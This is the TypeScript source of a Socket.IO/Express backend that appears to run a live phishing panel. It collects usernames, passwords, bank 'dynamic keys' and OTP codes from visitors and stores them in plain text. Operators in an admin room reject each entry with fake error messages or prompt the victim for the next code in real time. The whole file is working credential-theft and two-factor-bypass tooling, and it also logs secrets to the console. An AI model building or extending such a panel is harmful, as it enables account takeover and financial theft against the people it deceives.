import "dotenv/config";
import express from "express";
import http from "http";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import { Server, Socket } from "socket.io";
import { ActionState, SessionState } from "@prisma/client";
import { PrismaSessionRepository } from "./adapters/outbound/db/PrismaSessionRepository.js";
import { JwtTokenService } from "./adapters/outbound/auth/JwtTokenService.js";

type Role = "admin" | "user";

type Ack = (res: { ok: boolean; error?: string }) => void;

type Auth = { user: string; pass: string; dinamic: string; otp: string };

type AdminRejectPayload = { sessionId: string; message?: string };
type AdminRequestPayload = { sessionId: string };

type UserSubmitAuth = { auth: { user: string; pass: string } };
type UserSubmitDinamic = { auth: { dinamic: string } };
type UserSubmitOtp = { auth: { otp: string } };

export type AuthPayload =
  | { role: "admin"; adminId: string; email: string }
  | { role: "user"; sessionId: string };

const PORT = Number(process.env.PORT || 3005);
const ORIGIN = process.env.LARAVEL_ORIGIN || "http://localhost:8000";

const repo = new PrismaSessionRepository();
const tokens = new JwtTokenService(process.env.NODE_JWT_SECRET!);
console.log("NODE_JWT_SECRET set?", !!process.env.NODE_JWT_SECRET);
console.log("NODE_JWT_SECRET len:", process.env.NODE_JWT_SECRET?.length);

const app = express();
app.use(express.json());
app.use(helmet());
app.use(rateLimit({ windowMs: 60_000, max: 120 }));
app.use(cors({ origin: ORIGIN, credentials: true }));

const httpServer = http.createServer(app);
const io = new Server(httpServer, {
  cors: { origin: ORIGIN, credentials: true },
});

// Socket auth middleware
io.use((socket, next) => {
  const token = socket.handshake.auth?.token;
  if (!token) return next(new Error("missing_token"));
 try {
  socket.data.auth = tokens.verify(token);
  return next();
} catch (e) {
  console.error("JWT verify failed:", e);
  return next(new Error("invalid_token"));
}
});

function isNonEmptyString(v: unknown): v is string {
  return typeof v === "string" && v.trim().length > 0;
}

function mustBeAdmin(socket: Socket) {
  if (socket.data.auth?.role !== "admin") throw new Error("forbidden_admin");
}

function mustBeUser(socket: Socket) {
  if (socket.data.auth?.role !== "user") throw new Error("forbidden_user");
}

function getSessionIdFromSocket(socket: Socket): string {
  const sid =
    socket.data.auth?.role === "user" ? socket.data.auth.sessionId : null;

  if (!sid) throw new Error("missing_session");
  return sid;
}

async function emitSessionUpdate<T>(
  io: Server,
  repo: {
    findById: (id: string) => Promise<T | null>;
  },
  sessionId: string
) {
  const s = await repo.findById(sessionId);
  if (!s) return null;

  io.to(`session:${sessionId}`).emit("session:update", s);
  io.to("admins").emit("admin:sessions:upsert", s);

  return s;
}

const inactiveTimers = new Map<string, NodeJS.Timeout>();

function clearInactiveTimer(sessionId: string) {
  const t = inactiveTimers.get(sessionId);
  if (t) clearTimeout(t);
  inactiveTimers.delete(sessionId);
}

io.on("connection", async (socket) => {
  const auth = socket.data.auth;
  console.log(auth);

  if (auth.role === "admin") {
    socket.join("admins");
    // bootstrap rápido
    repo
      .listRecent(200)
      .then((list) => socket.emit("admin:sessions:bootstrap", list));

    socket.on("admin:reject_auth", async (payload: AdminRejectPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.AUTH_WAIT_ACTION) return;

        await repo.update(payload.sessionId, {
          action: ActionState.AUTH_ERROR,
          lastError: isNonEmptyString(payload.message)
            ? payload.message.trim()
            : "Error. Verifica e intenta nuevamente.",
        });

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:reject_auth error", e);
      }
    });

    socket.on("admin:request_dinamic", async (payload: AdminRequestPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (
          !s ||
          (s.action !== ActionState.AUTH_WAIT_ACTION &&
            s.action !== ActionState.OTP_WAIT_ACTION)
        )
          return;

        await repo.update(payload.sessionId, {
          action: ActionState.DINAMIC,
          lastError: null,
        });
        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:request_dinamic error", e);
      }
    });

    socket.on("admin:reject_dinamic", async (payload: AdminRejectPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.DINAMIC_WAIT_ACTION) return;

        await repo.update(payload.sessionId, {
          action: ActionState.DINAMIC_ERROR,
          lastError: isNonEmptyString(payload.message)
            ? payload.message.trim()
            : "Clave dinamica inválida. Verifica e intenta nuevamente.",
        });

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:reject_dinamic error", e);
      }
    });

    socket.on("admin:request_otp", async (payload: AdminRequestPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (
          !s ||
          (s.action !== ActionState.DINAMIC_WAIT_ACTION &&
            s.action !== ActionState.AUTH_WAIT_ACTION)
        )
          return;

        await repo.update(payload.sessionId, {
          action: ActionState.OTP,
          lastError: null,
        });

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:request_otp error", e);
      }
    });

    socket.on("admin:reject_otp", async (payload: AdminRejectPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.OTP_WAIT_ACTION) return;

        await repo.update(payload.sessionId, {
          action: ActionState.OTP_ERROR,
          lastError: isNonEmptyString(payload.message)
            ? payload.message.trim()
            : "Codigo otp inválido. Verifica e intenta nuevamente.",
        });

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:reject_otp error", e);
      }
    });

    socket.on("admin:finish", async (payload: AdminRequestPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.OTP_WAIT_ACTION) return;

        /*  await repo.update(payload.sessionId, {
          action: ActionState.DONE,
          lastError: null,
        }); */

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:finish error", e);
      }
    });
  }
  if (auth.role === "user") {
    const sessionId = auth.sessionId;

     // ✅ cancela INACTIVE pendiente

    socket.join(`session:${sessionId}`);

    clearInactiveTimer(sessionId);

    // ✅ al conectar: ACTIVE
    await repo.update(sessionId, { state: SessionState.ACTIVE });
    await emitSessionUpdate(io, repo, sessionId);

    // ✅ opcional: bootstrap inicial (ya lo hace emitSessionUpdate)
    // const s0 = await repo.findById(sessionId);
    // if (s0 && s0.action !== ActionState.AUTH_ERROR) socket.emit("session:update", s0);

    // ✅ presencia (MINIMIZED/ACTIVE) sin sessionId en payload
    socket.on("user:presence", async (payload: { state: SessionState }) => {
      try {
        mustBeUser(socket);
        const state = payload?.state;
        if (!state) return;

        await repo.update(sessionId, { state });
        await emitSessionUpdate(io, repo, sessionId);
      } catch (e) {
        console.error("user:presence error", e);
      }
    });

    socket.on("disconnect", () => {
      clearInactiveTimer(sessionId);
      const t = setTimeout(async () => {
        try {
          await repo.update(sessionId, { state: SessionState.INACTIVE });
          await emitSessionUpdate(io, repo, sessionId);
        } catch (e) {
          console.error("disconnect->inactive error", e);
        }
      }, 8000);
      inactiveTimers.set(sessionId, t);
    });

    // Si reconecta rápido (refresh), cancela INACTIVE
    // -------------------------
    // USER SUBMITS (sin sessionId en payload)
    // -------------------------

    socket.on(
      "user:submit_auth",
      async (payload: UserSubmitAuth, ack?: Ack) => {
        try {
          mustBeUser(socket);

          const pass = payload?.auth?.pass?.trim();
          const user = payload?.auth?.user?.trim();

          if (
            !isNonEmptyString(pass) ||
            pass.length < 2 ||
            !isNonEmptyString(user) ||
            user.length < 2
          ) {
            return ack?.({ ok: false, error: "invalid_credentials" });
          }

          const s = await repo.findById(sessionId);
          if (!s) return ack?.({ ok: false, error: "session not found" });

          const allowed: ActionState[] = [
            ActionState.AUTH,
            ActionState.AUTH_ERROR,
          ];
          
          if (!allowed.includes(s.action))
            return ack?.({ ok: false, error: "bad_state" });

          await repo.update(sessionId, {
            user,
            pass,
            action: ActionState.AUTH_WAIT_ACTION,
            lastError: null,
          });

          await emitSessionUpdate(io, repo, sessionId);
          ack?.({ ok: true });
        } catch (e) {
          console.error("user:submit_auth error", e);
          ack?.({ ok: false, error: "server_error" });
        }
      }
    );

    socket.on(
      "user:submit_dinamic",
      async (payload: UserSubmitDinamic, ack?: Ack) => {
        try {
          mustBeUser(socket);

          const dinamic = payload?.auth?.dinamic?.trim();
          if (!isNonEmptyString(dinamic) || dinamic.length < 5) {
            return ack?.({ ok: false, error: "invalid_dinamic" });
          }

          const s = await repo.findById(sessionId);
          if (!s) return ack?.({ ok: false, error: "not_found" });

          const allowed: ActionState[] = [
            ActionState.DINAMIC,
            ActionState.DINAMIC_ERROR,
          ];
          if (!allowed.includes(s.action))
            return ack?.({ ok: false, error: "bad_state" });

          await repo.update(sessionId, {
            dinamic,
            action: ActionState.DINAMIC_WAIT_ACTION,
            lastError: null,
          });

          await emitSessionUpdate(io, repo, sessionId);
          ack?.({ ok: true });
        } catch (e) {
          console.error("user:submit_dinamic error", e);
          ack?.({ ok: false, error: "server_error" });
        }
      }
    );

    socket.on("user:submit_otp", async (payload: UserSubmitOtp, ack?: Ack) => {
      try {
        mustBeUser(socket);

        const otp = payload?.auth?.otp?.trim(); // si tu tipo real es payload.otp, ajusta aquí
        if (!isNonEmptyString(otp) || otp.length < 5) {
          return ack?.({ ok: false, error: "invalid_otp" });
        }

        const s = await repo.findById(sessionId);
        if (!s) return ack?.({ ok: false, error: "not_found" });

        const allowed: ActionState[] = [ActionState.OTP, ActionState.OTP_ERROR];
        if (!allowed.includes(s.action))
          return ack?.({ ok: false, error: "bad_state" });

        await repo.update(sessionId, {
          otp,
          action: ActionState.OTP_WAIT_ACTION,
          lastError: null,
        });

        await emitSessionUpdate(io, repo, sessionId);
        ack?.({ ok: true });
      } catch (e) {
        console.error("user:submit_otp error", e);
        ack?.({ ok: false, error: "server_error" });
      }
    });
  }
});

// REST: crear sesión (user)
app.post("/api/sessions", async (_req, res) => {
  let data = _req.body;
  console.log(data);

  if (data.user && data.pass) {
    data.action = ActionState.AUTH_WAIT_ACTION;
  } else {
    data.action = ActionState.AUTH; // o el default de prisma
  }

  console.log(data);
  
  
  const session = await repo.create(data);
  const sessionToken = tokens.signUser(session.id);

  // avisar admins
  io.to("admins").emit("admin:sessions:upsert", session);

  res.json({ sessionId: session.id, sessionToken, session });
});

// Re-emitir token de user para una sesión existente
app.post("/api/sessions/:id/issue-token", async (req, res) => {
  const id = req.params.id;

  const s = await repo.findById(id);
  if (!s) return res.status(404).json({ error: "not_found" });

  const sessionToken = tokens.signUser(id);
  return res.json({ sessionId: id, sessionToken });
});


app.get("/api/sessions/:id", async (req, res) => {
  const session = await repo.findById(req.params.id);
  if (!session) return res.status(404).json({ error: "not_found" });
  const sessionToken = tokens.signUser(session.id);
  res.json({ sessionId: session.id, sessionToken, session });
});

// REST: emitir token admin (lo llama Laravel)
app.post("/api/admin/issue-token", (req, res) => {
  const secret = req.header("X-SHARED-SECRET");
  console.log(process.env.LARAVEL_SHARED_SECRET);
  console.log(secret);
  if (secret !== process.env.LARAVEL_SHARED_SECRET)
    return res.status(401).json({ error: "unauthorized" });

  const userId = req.header("X-Admin-Id") || "";

  const token = tokens.signAdmin(userId);
  res.json({ token });
});

app.post("/api/sessions/:id/presence", async (req, res) => {
  try {
    const id = req.params.id;
    const state = req.body?.state as SessionState | undefined;

    if (!state) return res.status(400).json({ ok: false });

    await repo.update(id, { state });
    // opcional emitir update si quieres:
    await emitSessionUpdate(io, repo, id);

    res.json({ ok: true });
  } catch (e) {
    console.error("presence REST error", e);
    res.status(500).json({ ok: false });
  }
});

httpServer.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`);
});
